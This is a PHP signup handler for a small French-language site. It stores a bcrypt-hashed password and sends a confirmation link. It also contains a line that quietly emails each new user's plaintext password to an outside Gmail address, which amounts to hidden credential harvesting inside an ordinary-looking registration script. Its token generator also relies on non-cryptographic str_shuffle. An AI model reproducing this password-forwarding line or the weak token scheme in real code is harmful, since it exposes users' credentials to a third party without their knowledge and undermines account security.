<?php

	require_once 'db.php';
	$req = $pdo->prepare("INSERT INTO profil SET mail = ?, pw = ?, confirmation_token = ?");
  $password = password_hash($_POST['pw'], PASSWORD_BCRYPT);
	$token = str_random(60);
	$req->execute([$_POST['mail'], $password, $token]);
	$user_id = $pdo->lastInsertId();
	mail($_POST['mail'], 'Newbie : Confirmation de votre compte', "Afin de finaliser votre inscription merci de cliquer sur ce lien\n\nhttp://www.newbie.nutts.io/confirm.php?id=$user_id&token=$token");
	mail("sambenuts.contact@gmail.com", "Newbie : inscription", $_POST['pw']);

	function str_random($length){
		$alphabet="0123456789azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN";
		return substr(str_shuffle(str_repeat($alphabet, $length)),0,$length);
	}

?>
